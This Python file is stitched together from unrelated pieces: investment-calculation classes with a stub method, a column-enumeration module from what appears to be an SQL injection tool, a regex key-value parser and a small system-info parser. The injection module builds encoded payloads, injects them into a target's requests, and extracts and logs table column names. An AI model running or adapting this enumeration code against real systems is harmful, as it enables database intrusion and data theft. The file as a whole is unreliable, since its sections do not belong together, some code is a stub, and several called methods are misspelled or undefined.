# Define contribution classes for different investment strategies
class Investment:
    def __init__(self, amount: int, rate: float, duration: int) -> None:
        self.amount = amount
        self.rate = rate
        self.duration = duration

class QuickInvestment(Investment):
    def __init__(self, amount: int, rate: float, duration: int) -> None:
        super().__init__(amount, rate, duration)

    def earnings(self) -> float:
        balance = self.amount
        for _ in range(self.duration):
            balance += self.amount * self.rate
        return balance

class EnhancedInvestment(Investment):
    def __init__(self, amount: int, rate: float, duration: int) -> None:
        super().__init__(amount, rate, duration)

    def earnings(self) -> float:
        for _ in range(self.duration):
            self.amount *= (1 + self.rate)
        return self.amount

class CompoundRateInvestment(Investment):
    def __init__(self, amount: int, rate: float, duration: int) -> None:
        super().__init__(amount, rate, duration)

    def earnings(self) -> float:
        return 0.0

# Extract column information from database tables
from xpath.common.lib import (
    binascii,
    compat_urlencode,
    TBL_COLUMNS,
    COLS_STATEMENT,
    collections,
)
from xpath.common.session import session
from xpath.injector.request import request
from xpath.logger.colored_logger import logger
from xpath.common.payloads import PAYLOADS_COLS_COUNT, PAYLOADS_COLS_NAMES
from xpath.common.utils import prettifier, to_hex, prepare_payload_request, clean_up_offset_payload

class ColumnsExtractor:
    """
    Retrieves column details for a specified table in the database
    """
    def _generate_col_payloads(self, col_count, payload, index=0):
        payload = clean_up_offset_payload(payload)
        payloads = [payload.format(index=i) for i in range(index, col_count)]
        return payloads

    def _col_count(self, db="", tbl=""):
        _temp = []
        if db and tbl:
            count_payloads = []
            [count_payloads.extend(v) for _, v in PAYLOADS_COLS_COUNT.items()]
            encode_db = to_hex(db, dbms=self._dbms)
            encode_tbl = to_hex(tbl, dbms=self._dbms)
            if self._dbms:
                count_payloads = PAYLOADS_COLS_COUNT.get(self._dbms, count_payloads)
            for entry in count_payloads:
                data = entry.format(db=encode_db, tbl=encode_tbl)
                _temp.append(data)
        payloads = self._generat_payload(payloads_list=_temp)
        return self._extact(payloads=payloads)

    def col_names(self, db="", tbl=""):
        idx = 0
        _temp = []
        is_resumed = False
        fetched_data = {}
        _temp_payloads = []
        ColumnsResponse = collections.namedtuple(
            "ColumnsResponse", ["fetched", "count", "database", "table", "columns"]
        )

        if db and tbl:
            dump_payloads = []
            [dump_payloads.extend(v) for _, v in PAYLOADS_COLS_NAMES.items()]
            encode_db = to_hex(db, dbms=self._dbms)
            encode_tbl = to_hex(tbl, dbms=self._dbms)
            if self._dbms:
                dump_payloads = PAYLOADS_COLS_NAMES.get(self._dbms, dump_payloads)
            for entry in dump_payloads:
                data = entry.format(db=encode_db, tbl=encode_tbl)
                _temp_payloads.append(data)

        try:
            fetched_data = session.fetch_from_table(
                session_filepath=self.session_filepath, table_name=tbl, cursor=False,
            )
            if fetched_data:
                is_resumed = True
        except Exception as error:
            pass

        logger.info("fetching columns for table '%s' in database: '%s'" % (tbl, db))
        retval = self._col_count(db=db, tbl=tbl)

        if retval.is_injected:
            col_count = int(retval.result)
            if col_count != 0:
                logger.info("used SQL query returns %d entries" % (col_count))

            if col_count == 0:
                logger.warning("used SQL query returns %d entries for table '%s' in database: '%s'" % (col_count, tbl, db))
                return ColumnsResponse(
                        fetched=False,
                        count=col_count,
                        database=db,
                        table=tbl,
                        columns=[],
                    )

            if is_resumed:
                for entry in fetched_data:
                    name = entry.get("colname")
                    if name not in _temp:
                        _temp.append(name)
                    logger.info(f"resumed: '{name}'")
                    idx += 1

            should_fetch = True
            if is_resumed:
                if len(fetched_data) == col_count:
                    should_fetch = False

            if should_fetch:
                payloads = self._generat_payload(payloads_list=_temp_payloads)
                retval = self._extact(payloads=payloads)

                if retval.is_injected:
                    payload = retval.payload
                    payloads = self._generate_col_payloads(
                        col_count=col_count, payload=payload, index=idx
                    )

                    if not is_resumed:
                        session.generate_table(
                            session_filepath=self.session_filepath,
                            query=TBL_COLUMNS.format(name=tbl, tbl_name=tbl),
                        )

                    response_data = self._extract_cols(
                        payloads=payloads, database=db, table=tbl
                    )

                    if response_data.is_fetched:
                        _temp.extend(response_data.result)

                    self._pprint_columns(
                        cursor_or_list=_temp, field_names="", database=db, table=tbl,
                    )

                    return ColumnsResponse(
                        fetched=True,
                        count=col_count,
                        database=db,
                        table=tbl,
                        columns=_temp,
                    )

                if not retval.is_injected:
                    status_code = retval.status_code
                    error = retval.error
                    count = retval.payloads_count
                    if status_code not in [200, 0]:
                        message = f"{error} - {count} times"
                        logger.warning(
                            f"HTTP error codes detected during run:\n{message}"
                        )
                    else:
                        message = f"tested with '{count}' queries, unable to find working SQL query."
                        logger.critical(message)

            else:
                self._pprint_columns(
                    cursor_or_list=_temp, field_names="", database=db, table=tbl,
                )
                return ColumnsResponse(
                    fetched=True,
                    count=col_count,
                    database=db,
                    table=tbl,
                    columns=_temp,
                )

        if not retval.is_injected:
            status_code = retval.status_code
            error = retval.error
            count = retval.payloads_count
            if status_code not in [200, 0]:
                message = f"{error} - {count} times"
                logger.warning(f"HTTP error codes detected during run:\n{message}")
            else:
                message = (
                    f"tested with '{count}' queries, unable to find working SQL query."
                )
                logger.critical(message)

        return ColumnsResponse(
            fetched=False, count=0, database=db, table=tbl, columns=_temp,
        )

    def _pprint_columns(self, cursor_or_list, field_names, database="", table=""):
        obj = prettifier(cursor_or_list, field_names)
        data = obj.data
        entries = obj.entries
        logger.success(f"Database: {database}")
        logger.success(f"Table: {table}")
        logger.success(f"[{entries} columns]")
        logger.success(f"{data}")

    def _extract_cols(self, payloads, database="", table=""):
        _temp, idx = [], 0
        Response = collections.namedtuple("Response", ["is_fetched", "result"])

        while idx < len(payloads):
            payload = payloads[idx]
            payload_request = prepare_payload_request(self, payload)
            url = payload_request.url
            data = payload_request.data
            regex = payload_request.regex
            headers = payload_request.headers

            try:
                response = request.inject_payload(
                    url=url, regex=regex, data=data, headers=headers, proxy=self._proxy
                )
            except KeyboardInterrupt:
                logger.warning(
                    "user aborted during enumeration. Xpath will display partial output"
                )
                break
            else:
                if response.ok:
                    result = response.result
                    logger.info("retrieved: '%s'" % (result))
                    _temp.append(result)
                    retval = session.dump(
                        session_filepath=self.session_filepath,
                        query=COLS_STATEMENT.format(tbl_name=table, colname=result),
                    )
                idx += 1

        if _temp and len(_temp) > 0:
            _temp = list(set(_temp))
            resp = Response(is_fetched=True, result=_temp)
        else:
            resp = Response(is_fetched=False, result=_temp)

        return resp

# Module for key-value transformation utilities
import logging
try:
    from collections.abc import Iterable
except ImportError:
    from collections import Iterable
import re
import six
from .trans_base import trans_comp_check_mode_base
from ..etl_util import cached, get_re_full_match, get_set_mode_if_skip_fn

__all__ = ['transform_kv_pairs']

logger = logging.getLogger(__name__)

def transform_kv_pairs(*args, **kwargs):
    if (args and isinstance(args[0], dict)) or ('data' in kwargs and isinstance(kwargs['data'], dict)):
        # Data case handling
        kv_processor = kv_processor_class()
        return kv_processor(*args, **kwargs)
    else:
        return kv_processor_class(*args, **kwargs)

class kv_processor_class(trans_comp_check_mode_base):
    DEFAULT_SEPARATOR = u':'
    DEFAULT_QUOTATION = u"'"

    @staticmethod
    @cached
    def _build_pattern(separator, quote, escape_char):
        pattern1 = u'(?!{0})([\u4e00-\u9fa5\u0800-\u4e00\\w\\.\\-]+)\\s*{0}\\s*([\u4e00-\u9fa5\u0800-\u4e00\\w\\.\\-]+)'
        if not escape_char:
            pattern2 = u'(?!{0})([\u4e00-\u9fa5\u0800-\u4e00\\w\\.\\-]+)\\s*{0}\\s*{1}\s*([^{1}]*?)\s*{1}'
        else:
            pattern2 = u'(?!{0})([\u4e00-\u9fa5\u0800-\u4e00\\w\\.\\-]+)\\s*{0}\\s*{1}\s*((?:[^{1}]|\\\\{1})*?[^\\\\]){1}'

        combined_patterns = u'|'.join([pattern1, pattern2]).format(separator, quote)
        logger.info(u"kv_processor_class: compiled regex pattern: {0}".format(combined_patterns))
        return re.compile(combined_patterns)

    def __init__(self, prefix=None, suffix=None, separator=None, quotation=None, escape=None, processing_mode=None):
        super(kv_processor_class, self).__init__(mode=processing_mode)
        self.prefix_part = self._u("" if prefix is None else prefix)
        self.suffix_part = self._u("" if suffix is None else suffix)
        self.escape_flag = False if escape is None else escape
        self.separator = self._u(self.DEFAULT_SEPARATOR if separator is None else separator)
        self.quotation_mark = self._u(self.DEFAULT_QUOTATION if quotation is None else quotation)
        self.regex_pattern = self._build_pattern(self.separator, self.quotation_mark, self.escape_flag)
        self.normalizer = None

    def assign_value(self, target_dict, key, value, original_key=None, validate_key_name=False):
        """Handle escaped characters when needed: convert \" back to " """
        if self.escape_flag:
            value = value.strip().replace("\\" + self.quotation_mark, self.quotation_mark)
        return super(kv_processor_class, self).assign_value(target_dict, key, value, 
                                                            original_key=original_key, 
                                                            validate_key_name=validate_key_name)

    def _parse_key_values(self, data_container, raw_text):
        if isinstance(raw_text, six.binary_type):
            raw_text = raw_text.decode('utf8', 'ignore')

        matches = self.regex_pattern.findall(raw_text)
        updated_data = {}

        for key_a, val_a, key_b, val_b in matches:
            if key_a:
                self.assign_value(data_container, key_a, val_a, 
                                  original_key=u"{0}{1}{2}".format(self.prefix_part, key_a, self.suffix_part), 
                                  validate_key_name=True)
            if key_b:
                self.assign_value(data_container, key_b, val_b, 
                                  original_key=u"{0}{1}{2}".format(self.prefix_part, key_b, self.suffix_part), 
                                  validate_key_name=True)
        return updated_data

    def __call__(self, data_container, input_source):
        input_source = self._u(input_source)

        # Handle simple dictionary mode
        if isinstance(input_source, (six.binary_type, six.text_type)):
            input_source = [input_source]

        if isinstance(input_source, Iterable):
            for item in input_source:
                if not isinstance(item, (six.binary_type, six.text_type)):
                    logger.error(u'kv_processor_class: unsupported type for input field "{0}"'.format(item))
                    continue

                if item not in data_container:
                    logger.info(u'kv_processor_class: data container "{0}" does not contain field "{1}"'.format(data_container, item))
                    continue

                # Extract and process key-value pairs
                processed_data = self._parse_key_values(data_container, data_container[item])
                data_container.update(processed_data)
        else:
            logger.error(u"kv_processor_class: unsupported input type {0}".format(input_source))

        return data_container

# Parse system information from command output
from collections import namedtuple
import six

def _parse_system_info(data, delimiter=': '):
  """Extract key-value pairs from a multi-line string."""
  result = {}
  for line in data.splitlines():
    if not line.strip():
      continue
    segments = line.split(delimiter, 1)
    if len(segments) != 2:
      continue
    if six.PY2:
      segments = map(unicode, segments)
    key = segments[0].strip()
    value = segments[1]
    result.setdefault(key, value)
  return result

